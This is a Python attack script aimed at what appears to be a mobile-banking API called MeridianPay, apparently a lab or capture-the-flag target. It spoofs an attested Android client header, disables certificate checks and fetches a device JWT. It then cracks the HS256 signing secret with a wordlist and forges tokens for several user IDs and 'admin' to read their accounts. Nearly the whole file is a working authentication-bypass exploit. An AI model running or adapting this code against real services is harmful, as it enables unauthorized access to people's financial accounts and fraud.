import base64
import hmac
import hashlib
import json
import urllib.request
import ssl

U = "https://web-3f25599ac74e8a91.web.h7tex.com"
CTX = ssl._create_unverified_context()
HDRS = {"X-Meridian-Client": "MeridianPay-Android/3.2.1 (attested)",
        "Content-Type": "application/json"}


def req(path, method="GET", data=None, headers=None):
    h = dict(HDRS)
    h.update(headers or {})
    body = json.dumps(data).encode() if data is not None else None
    r = urllib.request.Request(U + path, data=body, headers=h, method=method)
    try:
        with urllib.request.urlopen(r, timeout=20, context=CTX) as f:
            return f.status, f.read().decode(errors="replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode(errors="replace")
    except Exception as e:
        return 0, str(e)


st, tok = req("/api/v1/auth/device", "POST", {"device_id": "probe-9"})
d = json.loads(tok)
jwt = d["token"]
h64, p64, s64 = jwt.split(".")
def b64u(x):
    return base64.urlsafe_b64decode(x + "=" * (-len(x) % 4))
print("header:", b64u(h64))
print("payload:", b64u(p64))

secret = b64u(h64) + b"." + b64u(p64)
want = base64.urlsafe_b64decode(s64 + "=" * (-len(s64) % 4))

words = """
secret meridian meridianpay Meridian meridian-pay supersecret changeme password
hunter2 test default key jwt jwt-secret secretkey secret123 mysecret private
meridianpay3.21 3.2.1 android mobile banking bank neobank foundry proof totp
letmein admin user pass123 s3cr3t MeridianPay meridianpay3.2.1 HS256 hmac
meridian_secret meridianpay_secret app_secret appsecret signingkey signing_key
notsosecret guessme 12345678 abc123456 qwerty iloveyou monkey dragon sunshine
princess football shadow michelle access login welcome hello charlie donald
password1 123456789 1234567890 0000 password123 test123 testing demo dev staging
production prod secret-key secret_key topsecret topsecret123 verysecret
meridian2026 meridian2025 2026 2025 wrenfield northwind sparrow helios foundryproof
""".split()
cands = list(words) + [w + str(n) for w in words for n in range(10)] + \
        [w.title() for w in words] + [w.upper() for w in words]

found = None
for w in cands:
    kb = w.encode()
    if hmac.new(kb, secret, hashlib.sha256).digest() == want:
        found = w
        break
if not found:
    print(f"[-] secret not found in {len(cands)} candidates")
else:
    print("[+] JWT HS256 secret =", repr(found))

    def sign(payload):
        hh = base64.urlsafe_b64encode(json.dumps({"alg": "HS256", "typ": "JWT"},
                                                 separators=(",", ":")).encode()).rstrip(b"=")
        pp = base64.urlsafe_b64encode(json.dumps(payload, separators=(",", ":")).encode()).rstrip(b"=")
        ss = base64.urlsafe_b64encode(hmac.new(found.encode(), hh + b"." + pp, hashlib.sha256).digest()).rstrip(b"=")
        return (hh + b"." + pp + b"." + ss).decode()

    for sub in ["1000", "1001", "1002", "1003", "1", "admin"]:
        t = sign({"sub": sub, "iat": 1790412453, "exp": 1790498853})
        s, b = req("/api/v1/accounts/me", headers={"Authorization": "Bearer " + t})
        print(f"  sub={sub:6s} -> {s} {b[:200]}")
